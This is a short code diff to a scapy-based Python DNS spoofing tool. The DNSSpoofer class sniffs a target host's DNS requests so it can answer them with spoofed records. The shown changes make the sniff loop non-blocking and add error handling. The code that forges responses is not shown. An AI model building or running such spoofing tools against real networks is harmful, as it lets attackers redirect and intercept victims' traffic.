@@ -2,7 +2,7 @@
 
 from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send
 import sys
-
+import os
 class DNSSpoofer:
     def __init__(self, interface, target_ip, gateway_ip):
         self.interface = interface
@@ -53,17 +53,23 @@ class DNSSpoofer:
         print(f"[*] Spoofed DNS records: {self.dns_records}")
 
         try:
-            # Sniff for DNS requests
+            # Sniff for DNS requests with a timeout to make it non-blocking
             sniff(filter=f"udp port 53 and host {self.target_ip}",
                   prn=self.handle_dns_request,
                   store=0,
-                  iface=self.interface)
+                  iface=self.interface,
+                  stop_filter=lambda p: not self.spoofing,
+                  timeout=1)
         except KeyboardInterrupt:
+            self.stop()
+        except Exception as e:
+            print(f"[!] Error in DNS spoofing: {e}")
             self.stop()
 
     def stop(self):
         print("\n[*] Stopping DNS spoofing...")
         self.spoofing = False
+
 
 if __name__ == "__main__":
     # Example usage
